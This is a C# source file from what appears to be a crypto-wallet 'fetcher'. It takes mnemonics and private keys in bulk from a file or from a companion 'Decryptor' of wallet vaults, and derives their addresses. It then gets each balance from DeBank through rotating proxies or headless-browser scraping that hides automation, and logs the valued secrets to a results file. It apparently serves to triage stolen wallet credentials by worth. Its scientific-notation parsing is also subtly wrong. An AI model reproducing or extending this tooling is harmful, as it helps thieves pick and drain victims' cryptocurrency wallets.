using Nethereum.HdWallet;
using Nethereum.Web3.Accounts;
using PuppeteerSharp;
using Pastel;
using System.Collections.Concurrent;
using static Structures.Balances;
using static Structures;
using Leaf.xNet;
using Newtonsoft.Json.Linq;

public class Fetchers
{
    public class DeBank
    {
        public class BMethod
        {
            private IBrowser? browser;
            private IPage? page;
            public string Address;
            public bool IsConnected = false;
            public bool CBStatus = false;
            public bool LBStatus = false;
            public bool ODPStatus = false;

            public BMethod(string address, bool autoconnect = true)
            {
                Address = address;
                if (autoconnect is true)
                    Connect().GetAwaiter().GetResult();
            }

            private async Task<bool> CheckBrowser()
            {
                try
                {
                    using var browserFetcher = new BrowserFetcher();
                    var RevisionData = await browserFetcher.DownloadAsync(BrowserFetcher.DefaultChromiumRevision);
                    if (RevisionData.Downloaded is false) throw new Exception("Browser wasn't downloaded successfully (network error or timeout)");
                    CBStatus = true;
                    return true;
                }

                catch (Exception err)
                {
                    throw new Exception("CheckBrowser()", err);
                }
            }

            private async Task<bool> LaunchBrowser()
            {
                try
                {
                    browser = await Puppeteer.LaunchAsync(new LaunchOptions()
                    {
                        Headless = true,
                        Args = new[] {
                        "--disable-blink-features=AutomationControlled",
                        "--disable-background-timer-throttling",
                        "--disable-background-networking",
                        "--disable-gpu",
                        "--disable-extensions",
                        "--disable-plugins",
                        "--disable-breakpad",
                        "--disable-sync",
                        "--disable-translate",
                        "--disable-webgl",
                        "--disable-default-apps",
                        "--disable-infobars",
                        "--disable-features=site-per-process",
                        "--disable-hang-monitor",
                        "--disable-ipc-flooding-protection",
                        "--disable-renderer-backgrounding",
                        "--disable-software-rasterizer",
                        "--disable-notifications",
                        "--disable-voice-input",
                        "--disable-popup-blocking",
                        "--disable-prompt-on-repost",
                        "--disable-client-side-phishing-detection",
                        "--disable-component-extensions-with-background-pages",
                        "--no-sandbox",
                        "--no-experiments",
                        "--no-first-run",
                        "--disable-logging",
                        "--cpu-throttling-rate=30",
                        "--memory-limit=256",
                        "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
                    },
                        DefaultViewport = new ViewPortOptions { Width = 1280, Height = 720 }
                    });

                    if (browser is null) throw new Exception("Browser wasn't started successfully");
                    LBStatus = true;
                    return true;
                }

                catch (Exception err)
                {
                    throw new Exception("LaunchBrowser()", err);
                }
            }

            private async Task<bool> OpenDeBankProfile(string address)
            {
                try
                {
                    if (browser is null) throw new Exception("Browser wasn't started successfully");
                    page = await browser.NewPageAsync();
                    await page.GoToAsync($"https://debank.com/profile/{address}");
                    var UpdateElement = await page.WaitForXPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[2]/div/div[2]/div[2]/span/span");
                    if (UpdateElement is null) throw new Exception("DeBank Profile update element XPath is incorrect or timeouted");
                    ODPStatus = true;
                    return true;
                }

                catch (Exception err)
                {
                    await Close();
                    throw new Exception("OpenDeBankProfile()", err);
                }
            }

            public async Task<bool> IsEmpty()
            {
                try
                {
                    if (!IsConnected) throw new Exception("Not connected to DeBank Profile");
                    if (page is null) throw new Exception("Profile page wasn't opened");

                    var PortofolioXPath = await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[3]/div");
                    var PortofolioJSHandle = await PortofolioXPath[0].GetPropertyAsync("childNodes");
                    var PortofolioСhildNodes = await (await PortofolioJSHandle.EvaluateFunctionHandleAsync("nodes => Array.from(nodes)")).GetPropertiesAsync();
                    var EmptyClass = PortofolioСhildNodes.Any(el =>
                    {
                        var ClassNameHandle = el.Value.GetPropertyAsync("className").GetAwaiter().GetResult();
                        if (ClassNameHandle.JsonValueAsync().GetAwaiter().GetResult() is null) return false;
                        var className = ClassNameHandle.JsonValueAsync<string>().GetAwaiter().GetResult();
                        return className.Contains("Portfolio_noResult");
                    });

                    return EmptyClass;
                }

                catch (Exception err)
                {
                    await Close();
                    throw new Exception("IsEmpty()", err);
                }

            }

            public async Task<bool> Connect()
            {
                if (IsConnected is false)
                {
                    try
                    {
                        bool CBStatus = await CheckBrowser();
                        bool LBStatus = await LaunchBrowser();
                        bool ODPStatus = await OpenDeBankProfile(Address);
                        bool Status = CBStatus && LBStatus && ODPStatus;
                        IsConnected = Status;

                        return Status;
                    }

                    catch (Exception err)
                    {
                        Console.WriteLine(err);
                        await Close();
                        throw;
                    }
                }

                else
                    return true;
            }

            public async Task<double> GetTotalBalance()
            {
                try
                {
                    if (!IsConnected) throw new Exception("Not connected to DeBank Profile");
                    if (page is null) throw new Exception("Profile page wasn't opened");

                    var TotalBalanceXPath = await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[2]/div/div[1]/div[1]/div[2]/div[1]/div");
                    var TotalBalanceJSHandle = await TotalBalanceXPath[0].GetPropertyAsync("firstChild");
                    var TotalBalance = double.Parse(((string)await (await TotalBalanceJSHandle.GetPropertyAsync("textContent")).JsonValueAsync())
                        .Replace(",", "")
                        .Replace("$", "")
                        .Trim());

                    return TotalBalance;
                }

                catch (Exception err)
                {
                    throw new Exception("GetTotalBalance()", err);
                }
            }

            public async Task<List<Chain>?> GetChainsBalances()
            {
                try
                {
                    if (!IsConnected) throw new Exception("Not connected to DeBank Profile");
                    if (page is null) throw new Exception("Profile page wasn't opened");

                    var TotalBalance = await GetTotalBalance();
                    if (TotalBalance == 0.00) return null;

                    var Empty = await IsEmpty();
                    if (Empty) return null;

                    var PortofolioXPath = await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[3]/div");
                    if (PortofolioXPath is null) return null;
                    var PortofolioСhildNodes = Utils.Node.GetChildNodes(PortofolioXPath[0]);
                    if (PortofolioСhildNodes is null) return null;

                    var PortofolioSummary = Utils.Node.FindByClass(PortofolioСhildNodes, "Portfolio_collect");
                    if (PortofolioSummary is null) return null;
                    var PortofolioSummaryСhildNodes = Utils.Node.GetChildNodes(PortofolioSummary);
                    if (PortofolioSummaryСhildNodes is null) return null;

                    var PortofolioUsedChains = Utils.Node.FindByClass(PortofolioSummaryСhildNodes, "AssetsOnChain");
                    if (PortofolioUsedChains is null) return null;
                    var PortofolioUsedChainsChildNodes = Utils.Node.GetChildNodes(PortofolioUsedChains);
                    if (PortofolioUsedChainsChildNodes is null) return null;

                    var Chains = new List<Structures.Balances.Chain>();
                    foreach (var IChain in PortofolioUsedChainsChildNodes)
                    {
                        var IChainChildNodes = Utils.Node.GetChildNodes(IChain);
                        if (IChainChildNodes is null) continue;

                        var ChainInfo = Utils.Node.FindByClass(IChainChildNodes, "chainInfo");
                        if (ChainInfo is null) continue;

                        var ChainInfoChildNodes = Utils.Node.GetChildNodes(ChainInfo);
                        if (ChainInfoChildNodes is null) continue;

                        var ChainName = Utils.Node.FindByClass(ChainInfoChildNodes, "chainName");
                        if (ChainName is null) continue;

                        var ChainBalanceChildNodes = Utils.Node.GetChildNodes(ChainInfoChildNodes[1]);
                        if (ChainBalanceChildNodes is null) continue;

                        var ChainBalance = Utils.Node.FindByClass(ChainBalanceChildNodes, "usdValue");
                        if (ChainBalance is null) continue;

                        var IsValueParsed = double.TryParse((await ChainBalance.GetPropertyAsync("innerText")).JsonValueAsync().GetAwaiter().GetResult().ToString()?.Replace("$", "").Replace(",", ""), out double Value);
                        if (IsValueParsed is false) continue;
                        if (Value == 0) continue;

                        var Name = (await ChainName.GetPropertyAsync("innerText"))
                            .JsonValueAsync().GetAwaiter().GetResult()
                            .ToString()?
                            .Replace("Assets on", "")
                            .Trim()
                            .ToLower();

                        if (Name is null) continue;
                        var IsInDebankDictionary = Structures.DeBankChains.Any(el => el.Key == Name);
                        if (IsInDebankDictionary is true)
                        {
                            await ChainInfo.EvaluateFunctionAsync("element => element.click()");
                            Thread.Sleep(50);
                            var ChainPortofolioXpath = await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[3]/div/div[2]");
                            var ChainPortofolioСhildNodes = Utils.Node.GetChildNodes(ChainPortofolioXpath[0]);
                            if (ChainPortofolioСhildNodes is null) continue;
                            var ChainShowAllAsstes = Utils.Node.FindByClass(ChainPortofolioСhildNodes, "projectsShowAll");
                            if (ChainShowAllAsstes is not null)
                            {
                                await ChainShowAllAsstes.EvaluateFunctionAsync("element => element.click()");
                                ChainPortofolioXpath = await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[3]/div/div[2]");
                                ChainPortofolioСhildNodes = Utils.Node.GetChildNodes(ChainPortofolioXpath[0]);
                                if (ChainPortofolioСhildNodes is null) continue;
                            }
                            var ChainPools = Utils.Node.FindByClass(ChainPortofolioСhildNodes, "projectGrid");
                            if (ChainPools is null) continue;
                            var ChainPoolsChildNodes = Utils.Node.GetChildNodes(ChainPools);
                            if (ChainPoolsChildNodes is null) continue;

                            var Tokens = new List<Structures.Balances.Token>();
                            var Pools = new List<Structures.Balances.Pool>();

                            PortofolioXPath = await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[3]/div");
                            var PortofolioNodes = Utils.Node.GetChildNodes(PortofolioXPath[0]);
                            IJSHandle? ChainTokensContainer = null;

                            if (PortofolioNodes is not null)
                            {
                                var DefiOverviewNode = Utils.Node.FindByClass(PortofolioNodes, "defiItem");
                                if (DefiOverviewNode is not null)
                                {
                                    var DefiOverviewNodes = Utils.Node.GetChildNodes(DefiOverviewNode);
                                    if (DefiOverviewNodes is not null)
                                    {
                                        foreach (var PortofolioNode in DefiOverviewNodes)
                                        {
                                            if (PortofolioNode is null) continue;
                                            var DefiItemsNode = Utils.Node.GetChildNodes(PortofolioNode);
                                            if (DefiItemsNode is null) continue;
                                            var ItemBlock = Utils.Node.FindByClass(DefiItemsNode, "TokenWallet_container");

                                            if (ItemBlock is not null)
                                            {
                                                ChainTokensContainer = ItemBlock;
                                                break;
                                            }
                                        }
                                    }
                                }
                            };

                            if (ChainTokensContainer is not null)
                            {
                                var ChainTokensChildNodes = Utils.Node.GetChildNodes(ChainTokensContainer);
                                if (ChainTokensChildNodes is not null)
                                {
                                    var ChainTokensShowAll = Utils.Node.FindByClass(ChainTokensChildNodes, "showAll");
                                    if (ChainTokensShowAll is not null)
                                    {
                                        await ChainTokensShowAll.EvaluateFunctionAsync("element => element.click()");
                                        Thread.Sleep(50);
                                    }

                                    var ChainTokensXPath = (await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[3]/div/div[4]/div[1]/div[2]/div[1]/div/div[2]"))[0];
                                    var ChainTokensWrappedRows = Utils.Node.GetChildNodes(ChainTokensXPath);
                                    var ChainTokensUnwrappedRows = new List<IJSHandle>();

                                    if (ChainTokensWrappedRows is not null)
                                    {
                                        foreach (var WrappedRow in ChainTokensWrappedRows)
                                        {
                                            if (WrappedRow is null) continue;
                                            var UnwrappedRow = Utils.Node.GetChildNodes(WrappedRow)?[0];
                                            if (UnwrappedRow is null) continue;
                                            ChainTokensUnwrappedRows.Add(UnwrappedRow);
                                        }
                                    }

                                    if (ChainTokensUnwrappedRows.Count > 0)
                                    {
                                        foreach (var ChainToken in ChainTokensUnwrappedRows)
                                        {
                                            var ChainRows = Utils.Node.GetChildNodes(ChainToken);
                                            if (ChainRows is null) continue;
                                            var TokenName = (await ChainRows[0].GetPropertyAsync("innerText"))?
                                                .JsonValueAsync()
                                                .GetAwaiter()
                                                .GetResult()?
                                                .ToString();
                                            var StringTokenAmount = (await ChainRows[2].GetPropertyAsync("innerText"))?
                                                .JsonValueAsync()
                                                .GetAwaiter()
                                                .GetResult()?
                                                .ToString()?
                                                .Trim()?
                                                .Replace(",", "")?
                                                .Replace(".", ",");
                                            var StringTokenValue = (await ChainRows[3].GetPropertyAsync("innerText"))?
                                                .JsonValueAsync()
                                                .GetAwaiter()
                                                .GetResult()?
                                                .ToString()?
                                                .Trim()?
                                                .Replace(",", "")?
                                                .Replace("$", "")?
                                                .Replace("<", "")?
                                                .Replace(".", ",");
                                            if (StringTokenAmount is not null)
                                            {
                                                if (StringTokenAmount.Contains("B"))
                                                {
                                                    StringTokenAmount = StringTokenAmount.Replace("B", "");
                                                    var IsSTAParsed = double.TryParse(StringTokenAmount, out double STADouble);
                                                    if (IsSTAParsed is true)
                                                    {
                                                        STADouble *= 1000000000;
                                                        StringTokenAmount = STADouble.ToString();
                                                    }
                                                }

                                                if (StringTokenAmount.Contains("e"))
                                                {
                                                    var SplittedTokenAmount = StringTokenAmount.Split("e");
                                                    StringTokenAmount = SplittedTokenAmount[0];
                                                    var IsSTAParsed = double.TryParse(StringTokenAmount, out double STADouble);
                                                    if (IsSTAParsed is true)
                                                    {
                                                        STADouble *= Math.Pow(STADouble, int.Parse(SplittedTokenAmount[1]));
                                                        StringTokenAmount = STADouble.ToString();
                                                    }
                                                }
                                            }

                                            var IsTokenAmountParsed = double.TryParse(StringTokenAmount, out double TokenAmount);
                                            var IsTokenValueParsed = double.TryParse(StringTokenValue, out double TokenValue);

                                            if (TokenName is not null && IsTokenValueParsed is true && IsTokenAmountParsed is true && TokenValue > 1)
                                            {
                                                var Token = new Structures.Balances.Token()
                                                {
                                                    Name = TokenName,
                                                    Value = TokenValue,
                                                    Amount = TokenAmount,
                                                    Chain = Structures.DeBankChains[Name]
                                                };

                                                Tokens.Add(Token);
                                            }
                                        }
                                    }
                                }
                            };

                            foreach (var ChainPool in ChainPoolsChildNodes)
                            {
                                var ChainPoolData = Utils.Node.GetChildNodes(ChainPool)?[0];
                                if (ChainPoolData is null) continue;
                                var ChainPoolAssetData = Utils.Node.GetChildNodes(ChainPoolData)?[1];
                                if (ChainPoolAssetData is null) continue;
                                var ChainPoolAssetDataChildNodes = Utils.Node.GetChildNodes(ChainPoolAssetData);
                                if (ChainPoolAssetDataChildNodes is null) continue;
                                var PoolName = (await ChainPoolAssetDataChildNodes[0].GetPropertyAsync("innerText"))
                                    .JsonValueAsync().GetAwaiter().GetResult()
                                    .ToString()?
                                    .Trim();

                                if (PoolName is null || PoolName == "Wallet") continue;
                                var IsPoolValueParsed = double.TryParse((await ChainPoolAssetDataChildNodes[1].GetPropertyAsync("innerText")).JsonValueAsync().GetAwaiter().GetResult().ToString()?.Replace("$", "").Replace(",", ""), out double PoolValue);
                                if (IsPoolValueParsed is false) continue;
                                if (PoolValue == 0) continue;

                                var Pool = new Structures.Balances.Pool()
                                {
                                    Name = PoolName,
                                    Value = PoolValue,
                                    Chain = Structures.DeBankChains[Name]
                                };

                                Pools.Add(Pool);

                                if (ChainPoolsChildNodes.IndexOf(ChainPool) == (ChainPoolsChildNodes.Count - 1))
                                    await ChainInfo.EvaluateFunctionAsync("element => element.click()");
                            }

                            var Chain = new Structures.Balances.Chain()
                            {
                                Name = Structures.DeBankChains[Name],
                                Balances = new()
                                {
                                    Value = Value,
                                    Pools = Pools,
                                    Tokens = Tokens
                                }
                            };

                            Chains.Add(Chain);
                        }
                    }

                    return Chains;
                }

                catch (Exception err)
                {
                    await Close();
                    throw new Exception("GetChains()", err);
                }
            }

            public async Task<Total> GetAll()
            {
                var Total = new Total()
                {
                    Address = Address,
                    Value = await GetTotalBalance(),
                    Chains = await GetChainsBalances()
                };

                return Total;
            }

            public async Task Close()
            {
                if (page is not null) await page.CloseAsync();
                if (browser is not null) await browser.CloseAsync();
            }
        }

        public class WMethod
        {
            public static double? GetNetworth(string Address)
            {
                double? Networth = null;

                var Proxies = Utils.GrabProxiesFromSettings();
                if (Proxies is not null)
                {
                    foreach (var Proxy in Proxies)
                    {
                        var Request = new HttpRequest();
                        Request.Proxy = Utils.GetProxyClient(Proxy);
                        Request.AcceptEncoding = "none";
                        Request.Proxy.ConnectTimeout = 450;
                        Request.Proxy.ReadWriteTimeout = 450;

                        try
                        {
                            var Response = Request.Get($"https://api.debank.com/user/addr?addr={Address}");
                            var ResponseObject = JObject.Parse(Response.ToString());
                            var ResponseUSDValue = ResponseObject["data"]?["desc"]?["usd_value"];
                            if (ResponseUSDValue is not null) Networth = double.Parse(ResponseUSDValue.ToString());
                            break;
                        }

                        catch
                        {
                            continue;
                        }
                    }
                }

                return Networth;
            }
        }
    }

    public static Total? WFetchWallet(object Item, bool ConsoleOutput = true)
    {
        var Total = new Total();
        Account? NAccount = null;

        if (Item is StringWallet StringWallet)
        {
            if (StringWallet.Type is StringWalletTypes.Mnemonic)
            {
                var NWallet = new Wallet(StringWallet.Value, "");
                if (NWallet is null) return null;
                NAccount = NWallet.GetAccount(0);
                Total.Mnemonic = new() { Type = "Default", Value = StringWallet.Value };
            }

            else if (StringWallet.Type is StringWalletTypes.PrivateKey)
            {
                NAccount = new Account(StringWallet.Value);
                Total.PrivateKey = new() { Type = "Default", Value = StringWallet.Value };
            }
        }

        else if (Item is Mnemonic Mnemonic)
        {
            if (Mnemonic.Type != "Default") return null;
            var NWallet = new Wallet(Mnemonic.Value, "");
            NAccount = NWallet.GetAccount(0);
            Total.Mnemonic = Mnemonic;
        }

        else if (Item is PrivateKey Key)
        {
            if (Key.Type != "Default") return null;
            NAccount = new Account(Key.Value);
            Total.PrivateKey = Key;
        }

        else return null;

        if (NAccount is null)
        {
            return null;
        };

        try
        {
            var WNetworth = DeBank.WMethod.GetNetworth(NAccount.Address);

            Total = new Total()
            {
                Address = NAccount.Address,
                Value = WNetworth is null ? 0 : Math.Round(WNetworth.Value, 2),
                PrivateKey = Total.PrivateKey is null ? null : Total.PrivateKey,
                Mnemonic = Total.Mnemonic is null ? null : Total.Mnemonic,
                Status = WNetworth is not null
            };

            Console.WriteLine($" [{DateTime.Now:HH:mm:ss}] {Total.Address.Pastel(ConsoleColor.Yellow)} => {(Total.Value > 0 ? $"{Total.Value}$".Pastel(System.Drawing.Color.GreenYellow) : $"{Total.Value}$".Pastel(System.Drawing.Color.OrangeRed))}");
            return Total;
        }

        catch
        {
            return null;
        };
    }

    public static async Task<Total?> BFetchWallet(object Item)
    {
        var Total = new Total();
        Account? NAccount = null;

        if (Item is StringWallet StringWallet)
        {

            if (StringWallet.Type is StringWalletTypes.Mnemonic)
            {
                var NWallet = new Wallet(StringWallet.Value, "");
                if (NWallet is null) return null;
                NAccount = NWallet.GetAccount(0);
                Total.Mnemonic = new() { Type = "Default", Value = StringWallet.Value };
            }

            else if (StringWallet.Type is StringWalletTypes.PrivateKey)
            {
                NAccount = new Account(StringWallet.Value);
                Total.PrivateKey = new() { Type = "Default", Value = StringWallet.Value };
            }
        }

        else if (Item is Mnemonic Mnemonic)
        {
            if (Mnemonic.Type != "Default") return null;
            var NWallet = new Wallet(Mnemonic.Value, "");
            NAccount = NWallet.GetAccount(0);
            Total.Mnemonic = Mnemonic;
        }

        else if (Item is PrivateKey Key)
        {
            if (Key.Type != "Default") return null;
            NAccount = new Account(Key.Value);
            Total.PrivateKey = Key;
        }

        else return null;

        if (NAccount is null)
        {
            return null;
        };

        try
        {
            Console.WriteLine($" [{DateTime.Now:HH:mm:ss}] {NAccount.Address.Pastel(System.Drawing.Color.Yellow)} {"trying to connect...".Pastel(System.Drawing.Color.Yellow)}");
            var Profile = new DeBank.BMethod(NAccount.Address);
            Console.WriteLine($" [{DateTime.Now:HH:mm:ss}] {NAccount.Address.Pastel(System.Drawing.Color.Yellow)} {"connected!".Pastel(System.Drawing.Color.Yellow)}");
            var WTotal = await Profile.GetAll();
            await Profile.Close();

            Total = new Total()
            {
                Address = WTotal.Address,
                Chains = WTotal.Chains,
                Value = WTotal.Value,
                PrivateKey = Total.PrivateKey is null ? null : Total.PrivateKey,
                Mnemonic = Total.Mnemonic is null ? null : Total.Mnemonic,
            };

            return Total;
        }

        catch
        {
            return null;
        };
    }

    public static async Task<List<Total>> BFetchSecret(Vault.Secret Secret)
    {
        var Balances = new List<Total>();
        var Combined = new List<object>();

        if (Secret.Mnemonics is not null)
            Secret.Mnemonics.ForEach(mnemonic => Combined.Add(mnemonic));

        if (Secret.PrivateKeys is not null)
            Secret.PrivateKeys.ForEach(key => Combined.Add(key));

        if (Combined.Count == 0) return Balances;

        foreach (var Item in Combined)
        {
            DateTime TryTime = DateTime.Now;
            var ItemData = await BFetchWallet(Item);
            if (ItemData is null) continue;
            Balances.Add(ItemData.Value);
        }

        return Balances;
    }

    public static async Task<List<Total>> BFetchStrings(StringSecret StringSecret)
    {
        var Balances = new List<Total>();
        var Secret = new Vault.Secret
        {
            Mnemonics = new(),
            PrivateKeys = new()
        };

        if (StringSecret.PrivateKeys is not null) StringSecret.PrivateKeys.ForEach(key => Secret.PrivateKeys.Add(new() { Type = "Default", Value = key }));
        if (StringSecret.Mnemonics is not null) StringSecret.Mnemonics.ForEach(mnemonic => Secret.Mnemonics.Add(new() { Type = "Default", Value = mnemonic }));

        Balances = await BFetchSecret(Secret);

        return Balances;
    }

    public static List<Total> Call(string WorkPath, string ResultsPath, List<Vault.Secret>? Secrets = null, bool FromDecryptor = false)
    {
        if (FromDecryptor is false)
            Utils.ClearAndShow();

        var Balances = new List<Total>();
        var Settings = new Utils.IniFile("Settings.ini");
        string? Threads = Settings.Read("Fetcher", "Threads");
        Threads ??= "1";
        var CallTime = DateTime.Now;
        var ItemList = new List<object>();

        Console.WriteLine($" {"FETCHER LAUNCHED".Pastel(System.Drawing.Color.OrangeRed)}\n");
        Console.Title = "Fetcher";

        if (Secrets is null && FromDecryptor is false)
        {
            if (!File.Exists(WorkPath))
                return Balances;

            Console.WriteLine(" ! Collecting data from work path");
            var StringWallets = Utils.GrabStringWallets(WorkPath);

            if (StringWallets is null)
            {
                Console.WriteLine($" ! No any mnemonics or private keys found");
                return Balances;
            }
            Console.WriteLine(" ! Collecting is done, processing...\n");

            StringWallets.ForEach(wallet => ItemList.Add(wallet));
        }

        else if (Secrets is not null && FromDecryptor is true)
        {
            Secrets.ForEach(secret => 
            {
                if (secret.Mnemonics is not null)
                    secret.Mnemonics.ForEach(mnemonic => ItemList.Add(mnemonic));
                if (secret.PrivateKeys is not null)
                    secret.PrivateKeys.ForEach(key => ItemList.Add(key));
            });
        }

        else if (Secrets is null && FromDecryptor is true)
        {
            Console.WriteLine(" ! No any data to fetch");
            return Balances;
        }

        int ProcessorCount = Environment.ProcessorCount;
        Console.Title = $"Fetcher [{ItemList.Count} secrets]";
        var Partitions = Partitioner.Create(ItemList).GetPartitions(int.Parse(Threads));
        var Tasks = new List<Task>();
        int FetchedCount = 0;

        foreach (var Partition in Partitions)
        {
            var task = Task.Run(() =>
            {
                while (Partition.MoveNext())
                {
                    try
                    {
                        var Item = Partition.Current;
                        var WBalance = WFetchWallet(Item);
                        if (WBalance is not null)
                        {
                            Balances.Add(WBalance.Value);
                            Recorders.Universal.Record(ResultsPath, WBalance.Value);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }

                    FetchedCount++;
                    Console.Title = $"Fetching [{FetchedCount}/{ItemList.Count} secrets]";
                }
            });

            Tasks.Add(task);
        }

        Task.WaitAll(Tasks.ToArray());

        return Balances;
    }
}